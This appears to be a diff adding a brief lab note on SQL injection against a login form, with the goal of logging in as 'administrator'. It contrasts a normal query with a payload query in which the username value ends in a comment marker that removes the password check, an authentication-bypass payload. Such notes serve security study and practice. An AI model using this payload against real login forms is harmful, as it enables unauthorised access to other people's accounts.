@@ -1,0 +1,8 @@
+SQL Injection - Login Functionality
+
+Goal: Login to the application as the `administrator` user
+
+Process:
+
+SELECT * FROM users WHERE username = 'administrator' AND password = '1234123'; -- Normal Query
+SELECT * FROM users WHERE username = 'administrator'--' AND password = '1234123'; -- Payload query
